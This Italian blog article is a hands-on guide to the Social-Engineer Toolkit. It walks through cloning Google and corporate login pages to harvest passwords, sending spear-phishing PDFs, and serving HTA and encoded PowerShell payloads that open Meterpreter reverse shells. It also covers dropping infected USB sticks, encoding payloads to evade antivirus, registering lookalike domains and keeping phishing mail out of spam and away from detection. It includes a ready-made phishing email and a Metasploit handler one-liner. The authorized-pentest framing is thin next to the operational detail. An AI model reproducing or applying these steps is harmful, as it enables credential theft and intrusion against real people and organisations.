---
title: 'Social-Engineer Toolkit (SET): Guida Completa per Attacchi Social Engineering'
slug: socialengineer
description: 'SET è un framework per simulazioni di social engineering in ambienti autorizzati: phishing, credential harvester e attacchi client-side.'
image: /Gemini_Generated_Image_bdfrnxbdfrnxbdfr.webp
draft: true
date: 2026-02-25T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - phishing
---

Il Social-Engineer Toolkit è il framework standard per automatizzare attacchi basati sul fattore umano. In questa guida impari a clonare siti per credential harvesting, generare payload malevoli, configurare campagne spear-phishing e integrare SET con Metasploit per exploitation completa. Tecniche reali da penetration test, pronte all'uso.

## Installazione e Setup

Su Kali Linux SET è preinstallato. Verifica e avvia:

```bash
sudo setoolkit
```

Per installazione manuale:

```bash
git clone https://github.com/trustedsec/social-engineer-toolkit.git /opt/setoolkit
cd /opt/setoolkit
pip3 install -r requirements.txt
python3 setup.py install
sudo setoolkit
```

Al primo avvio appare il menu principale:

```
Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   
   99) Exit the Social-Engineer Toolkit
```

Configura il file `/etc/setoolkit/set.config` per personalizzare comportamento e integrazione Metasploit:

```bash
METASPLOIT_PATH=/usr/share/metasploit-framework
APACHE_SERVER=ON
APACHE_DIRECTORY=/var/www/html
EMAIL_PROVIDER=GMAIL
```

## Uso Base: Credential Harvester

L'attacco più efficace e più usato. Clona una pagina login e cattura credenziali inserite dalla vittima.

Naviga nel menu:

```
1) Social-Engineering Attacks
2) Website Attack Vectors  
3) Credential Harvester Attack Method
2) Site Cloner
```

SET chiede due informazioni:

```
IP address for the POST back in Harvester/Tabnabbing [192.168.1.50]:
Enter the url to clone: https://accounts.google.com
```

Output quando il server è pronto:

```
[*] Cloning the website: https://accounts.google.com
[*] This could take a little bit...
[*] Credential harvester is now listening below...

[*] The site has been cloned and is ready.
[*] Listening on port 80
```

Quando la vittima inserisce credenziali:

```
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: email=victim@gmail.com
POSSIBLE PASSWORD FIELD FOUND: password=SuperSecret123!
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
```

### Template Predefiniti

SET include template ottimizzati per servizi comuni:

```
1) Java Required
2) Gmail  
3) Google
4) Facebook
5) Twitter
6) Yahoo
```

Selezionando un template non serve specificare URL, SET usa pagine pre-costruite.

## Tecniche Pratiche di Attacco

### Spear Phishing con Payload Malevolo

Genera email con allegati che stabiliscono reverse shell:

```
1) Social-Engineering Attacks
1) Spear-Phishing Attack Vectors
1) Perform a Mass Email Attack
```

Seleziona il payload:

```
1) Perform a Mass Email Attack
   
   Select payload to use:
   1) Set your own executable
   2) Built-in .pdf exploit
   3) Built-in Microsoft Word exploit
   4) Custom executable
   
   > 2
```

Configura il listener:

```
set:payload> Enter IP address for reverse connection: 192.168.1.50
set:payload> Enter port for reverse connection: 4444
```

SET genera il PDF malevolo e configura automaticamente il listener Metasploit.

### HTA Attack per Shell Fileless

Tecnica potente che bypassa molti AV eseguendo codice in memoria:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
7) HTA Attack Method
```

Output:

```
[*] Generating HTA attack...
[*] Payload has been created.
[*] Payload is hosted at: http://192.168.1.50/Launcher.hta

[*] When the victim downloads and runs the HTA file,
[*] a Meterpreter session will open.
```

Quando la vittima apre il file HTA e accetta l'esecuzione, ottieni shell immediata.

### PowerShell Injection Fileless

Per target Windows moderni, payload PowerShell in memoria:

```
1) Social-Engineering Attacks
9) PowerShell Attack Vectors
1) PowerShell Alphanumeric Shellcode Injector
```

Genera un one-liner PowerShell encoded:

```
powershell -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUA...
```

Questo comando scarica ed esegue lo shellcode interamente in RAM senza toccare disco.

### Web Jacking Attack

Tecnica che redirige il browser della vittima dopo interazione:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
5) Web Jacking Attack Method
```

La vittima visita la pagina, clicca su un elemento, e viene rediretta al sito clonato per credential harvesting.

### Multi-Attack Web Method

Combina più vettori sulla stessa pagina per massimizzare successo:

```
1) Social-Engineering Attacks
2) Website Attack Vectors
6) Multi-Attack Web Method
```

Abilita selettivamente:

```
1) Java Applet Attack Method        [ON/OFF]
2) Metasploit Browser Exploit       [ON/OFF]
3) Credential Harvester             [ON/OFF]
4) Tabnabbing Attack Method         [ON/OFF]
5) Man Left in the Middle           [ON/OFF]
```

## Tecniche Avanzate

### Infectious Media Generator

Per scenari con accesso fisico, genera USB malevole:

```
1) Social-Engineering Attacks
3) Infectious Media Generator
2) Standard Metasploit Executable
```

Configura:

```
Enter IP for reverse connection: 192.168.1.50
Enter port: 4444
```

SET crea `/root/.set/autorun/` con:

```
autorun.inf
payload.exe
```

Copia su USB. Su sistemi con autorun abilitato (legacy), il payload esegue automaticamente.

### Bypass AV con Encoding

I payload stock sono signatured. Usa encoding:

```
Do you want to create a meterpreter payload? [yes/no]: yes
Enter encoding (shikata_ga_nai, etc): shikata_ga_nai
Enter iterations: 5
```

Per evasion più avanzata, genera con [msfvenom](https://hackita.it/articoli/msfvenom) separatamente e importa in SET.

### Integrazione Metasploit

SET avvia listener automaticamente, ma puoi configurare manualmente:

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit -j"
```

Per integrazione completa, assicurati che `METASPLOIT_PATH` sia corretto in `set.config`.

### Domain Impersonation

Per phishing credibile:

1. Registra dominio simile (es: g00gle.com, microsoft-support.com)
2. Configura SSL con Let's Encrypt
3. Clona il sito target con SET
4. Invia email da dominio spoofato

SET gestisce il credential harvesting, tu gestisci l'infrastruttura di delivery.

## Scenari Pratici di Pentest

### Scenario 1: Campagna Phishing Corporate

Obiettivo: testare awareness dipendenti di un'azienda.

**Step 1** - Raccogli email con [theHarvester](https://hackita.it/articoli/theharvester):

```bash
theHarvester -d targetcompany.com -b google,linkedin -l 500
```

**Step 2** - Registra dominio simile (targetcompany-hr.com)

**Step 3** - Configura SET per clonare il portale webmail aziendale:

```
2) Website Attack Vectors
3) Credential Harvester
2) Site Cloner
URL: https://mail.targetcompany.com
```

**Step 4** - Crafta email convincente:

```
Subject: [HR] Aggiornamento urgente policy aziendale

Gentile collega,
è necessario confermare la lettura della nuova policy accedendo al portale:
https://mail.targetcompany-hr.com

Cordiali saluti,
Risorse Umane
```

**Step 5** - Monitora credenziali catturate e documenta per report.

### Scenario 2: Payload Delivery via Spear Phishing

Obiettivo: ottenere shell su workstation target.

**Step 1** - Identifica target specifico tramite OSINT

**Step 2** - Genera payload PDF:

```
1) Social-Engineering Attacks
1) Spear-Phishing Attack Vectors
2) Create a FileFormat Payload
14) Adobe PDF Embedded EXE
```

**Step 3** - Configura email personalizzata basata su OSINT (colleghi, progetti, interessi)

**Step 4** - Invia e attendi connessione Meterpreter

**Step 5** - Post-exploitation con moduli Metasploit

### Scenario 3: Red Team con HTA

Obiettivo: accesso iniziale bypass AV.

**Step 1** - Setup server web con SET:

```
2) Website Attack Vectors
7) HTA Attack Method
```

**Step 2** - Ottieni URL: `http://attacker.com/Launcher.hta`

**Step 3** - Delivery tramite:

* Email con link
* Document con link embedded
* Redirect da sito compromesso

**Step 4** - Vittima apre HTA, conferma esecuzione → Shell

**Step 5** - Migra processo, stabilisci persistenza

### Scenario 4: Physical Pentest con USB

Obiettivo: testare sicurezza fisica.

**Step 1** - Genera infectious media con SET

**Step 2** - Prepara USB con label credibile ("Salary\_Review\_2024")

**Step 3** - "Dimentica" USB in area comune (parcheggio, reception, mensa)

**Step 4** - Setup listener e attendi

**Step 5** - Se qualcuno inserisce e esegue, ottieni shell

## Tabelle di Riferimento

### Vettori di Attacco SET

| Vettore              | Tipo    | Rilevamento | Efficacia               |
| -------------------- | ------- | ----------- | ----------------------- |
| Credential Harvester | Passive | Basso       | Alta                    |
| HTA Attack           | Active  | Medio       | Alta                    |
| PDF Exploit          | Active  | Alto        | Media                   |
| PowerShell Injection | Active  | Medio       | Alta                    |
| USB Autorun          | Active  | Alto        | Bassa (sistemi moderni) |
| Tabnabbing           | Passive | Basso       | Media                   |

### Payload e Compatibilità

| Payload                 | Target        | AV Detection | Note                         |
| ----------------------- | ------------- | ------------ | ---------------------------- |
| Meterpreter Reverse TCP | Windows/Linux | Alto (stock) | Encoding necessario          |
| PowerShell Shellcode    | Windows       | Medio        | Fileless                     |
| HTA Dropper             | Windows       | Medio        | Richiede interazione         |
| PDF Embedded            | Windows       | Alto         | Adobe vulnerabile necessario |
| Macro Word              | Windows       | Alto         | Office con macro abilitate   |

### Configurazioni Comuni

| Parametro           | File       | Valore                          |
| ------------------- | ---------- | ------------------------------- |
| METASPLOIT\_PATH    | set.config | /usr/share/metasploit-framework |
| APACHE\_SERVER      | set.config | ON                              |
| AUTO\_MIGRATE       | set.config | ON                              |
| EMAIL\_PROVIDER     | set.config | SENDMAIL/GMAIL                  |
| HARVESTER\_REDIRECT | set.config | ON                              |

## Troubleshooting

### Apache Non Parte

```bash
# Errore: porta 80 occupata
sudo fuser -k 80/tcp
sudo setoolkit
```

Oppure modifica porta in set.config:

```
APACHE_PORT=8080
```

### Clonazione Sito Fallisce

Siti con JavaScript pesante o protezioni anti-scraping potrebbero non clonarsi correttamente.

Soluzioni:

* Usa template predefiniti
* Clona manualmente con wget e adatta
* Usa HTTrack per siti complessi

### Payload Non Connette

```bash
# Verifica firewall locale
sudo ufw allow 4444/tcp

# Verifica listener attivo
netstat -tlnp | grep 4444

# Usa porta 443 (meno filtrata)
set LPORT 443
```

### Email in Spam

* Configura SPF/DKIM/DMARC sul dominio di invio
* Evita parole trigger (urgent, password, account)
* Usa dominio con reputazione (non appena registrato)
* Personalizza contenuto per target

## FAQ

**SET funziona ancora con browser/sistemi moderni?**

Il credential harvester funziona sempre perché sfrutta comportamento umano, non vulnerabilità tecniche. Exploit PDF e Java sono meno efficaci su sistemi patchati. HTA e PowerShell rimangono efficaci con AV appropriato.

**Come rendo le email più credibili?**

OSINT approfondito sul target. Usa contesto realistico (progetti in corso, colleghi reali, eventi aziendali). Evita errori grammaticali. Matching visivo perfetto con comunicazioni aziendali reali.

**SET vs Gophish?**

SET è più versatile (payload, USB, web attacks multipli). [Gophish](https://hackita.it/articoli/gophish) eccelle in email phishing con tracking avanzato e reporting. Per campagne awareness pure, Gophish. Per pentest completi, SET.

**Come bypasso 2FA?**

SET standard non bypassa 2FA. Per session hijacking con 2FA attivo, usa [Evilginx2](https://hackita.it/articoli/evilginx2) che intercetta token di sessione post-autenticazione.

**Posso usare SET per awareness training?**

Assolutamente. È uno dei casi d'uso principali. Molte aziende conducono campagne periodiche per misurare click rate e credential submission rate.

**Come evito detection durante campagne?**

Dominio aged, SSL valido, infrastruttura pulita (non blacklisted), invio graduale (non 1000 email in 5 minuti), contenuto personalizzato per target.

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per campagne social engineering autorizzate e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [SET GitHub](https://github.com/trustedsec/social-engineer-toolkit) | [TrustedSec](https://www.trustedsec.com/)
